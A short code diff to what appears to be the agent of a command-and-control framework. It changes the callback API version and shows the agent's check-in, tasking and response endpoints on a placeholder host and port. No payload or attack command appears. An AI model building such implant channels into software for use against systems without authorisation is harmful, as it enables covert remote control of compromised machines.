@@ -9,7 +9,7 @@ class C2():
     from math import ceil
     import ssl
     def __init__(self):
-        self.url_base = "callback_host:callback_port/api/v1.2/"
+        self.url_base = "callback_host:callback_port/api/v1.3/"
         self.checkin_uri = "callbacks"
         self.tasking_uri = "tasks/callback/{}/nextTask"
         self.response_uri = "responses/{}"
